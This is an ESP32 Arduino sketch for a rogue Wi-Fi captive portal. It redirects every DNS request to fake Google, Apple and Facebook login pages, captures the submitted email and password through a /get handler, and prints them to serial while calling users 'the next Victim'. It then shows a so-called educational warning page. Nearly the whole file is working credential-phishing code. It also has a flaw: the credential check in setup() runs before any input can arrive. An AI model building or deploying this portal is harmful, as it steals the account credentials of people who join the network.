  /* ˗ˏˋ 𒉭  Dynamic captive portal  𒉭 ˊˎ˗   
     */

//Define libraries & variables
#include <DNSServer.h>
#include <WiFi.h>
#include <AsyncTCP.h>
#include "ESPAsyncWebServer.h"
#include "FS.h"
#include <LittleFS.h>

// eSrver related variables
DNSServer dnsServer;
AsyncWebServer server(80);

// Defining Credwntial variables
String email; // email
String passwd; // pass
bool email_received = false;
bool passwd_received = false;

// Handle requests
class CaptiveRequestHandler : public AsyncWebHandler {
public:
  CaptiveRequestHandler() {}
  virtual ~CaptiveRequestHandler() {}

  bool canHandle(AsyncWebServerRequest *request){
    //request->addInterestingHeader("ANY");
    return true;
  }

  void handleRequest(AsyncWebServerRequest *request) {
    request->send(LittleFS, "/index.html", "text/html");
  }
};

void setupServer() {
  // 2Serve 
  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(LittleFS, "/index.html", "text/html");
  });

  // 2 redirection of the initial internet request
  server.onNotFound([](AsyncWebServerRequest *request){
      request->send(LittleFS, "/index.html", "text/html");
  });

  // Serve images 
  server.on("/isplogo.png", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(LittleFS, "/isplogo.png", "image/png");
  });
  server.on("/Kelogo.png", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(LittleFS, "/Kelogo.png", "image/png");
  });

  // Serve other pages
  server.on("/google", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(LittleFS, "/google.html", "text/html");
  });

  server.on("/apple", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(LittleFS, "/apple.html", "text/html");
  });

  server.on("/facebook", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(LittleFS, "/facebook.html", "text/html");
  });

  server.on("/warning", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(LittleFS, "/warning.html", "text/html"); 
  });

  // Handle unknown requests (default to index.html for captive portal)
  server.onNotFound([](AsyncWebServerRequest *request){
    request->send(LittleFS, "/index.html", "text/html");
  });

  // Receive and process user input (Backend handling)  
  server.on("/get", HTTP_GET , [] (AsyncWebServerRequest *request) {
    String inputMessage;
    
    // Capture email
    if (request->hasParam("email")) {
      inputMessage = request->getParam("email")->value(); //the true makes it read from the POST body n0t url
      email = inputMessage;
      Serial.println("Captured Email: " + inputMessage);
      email_received = true;
    }
    
    // Capture Passwd
    if (request->hasParam("passwd")) {
      inputMessage = request->getParam("passwd")->value();
      passwd = inputMessage;
      Serial.println("Captured Password: " + inputMessage);
      passwd_received = true;
    }
    // Send educational warning after credental leak 
    request->send(LittleFS, "/warning.html", "text/html");
  });
}

void setup(){
  // 0ther setup stuff...
  Serial.begin(115200);
  Serial.println();

  // start SPIFFS
  if (!LittleFS.begin(true)){
    Serial.print("LittleFS FAILED!");
    return;    
  }
  Serial.println("LittleFS mount successful");

  // AP set up & dns
  Serial.println("Setting up AP Mode");
  WiFi.mode(WIFI_AP); 
  WiFi.softAP("youreCook3d2", "12345678");
  Serial.print("AP IP address: ");Serial.println(WiFi.softAPIP());
  Serial.println("Setting up Async WebServer");
  setupServer();

  Serial.println("Starting DNS Server");
  dnsServer.start(53, "*", WiFi.softAPIP());
  server.addHandler(new CaptiveRequestHandler()).setFilter(ON_AP_FILTER); //only when requested from AP
  // more handlers...
  server.begin();
  Serial.println("All Done!");

  if(email_received && passwd_received){
      Serial.print("Captured Email: ");Serial.println(email);
      Serial.print("Captured Passwd ");Serial.println(passwd);
      email_received = false;
      passwd_received = false;
      Serial.println("Waiting for the next Victim now ( -_•)▄︻デ══━一 ");
      Serial.println("   -𒉭𒉭𒉭𒉭𒉭𒉭𒉭𒉭𒉭𒉭𒉭𒉭𒉭-");
  }
}

void loop(){
  dnsServer.processNextRequest();
}

/* 
to do
  
  1.) Continous Study >>> https://github.com/bigbrodude6119/flipper-zero-evil-portal/blob/main/esp32/EvilPortal/EvilPortal.ino

*/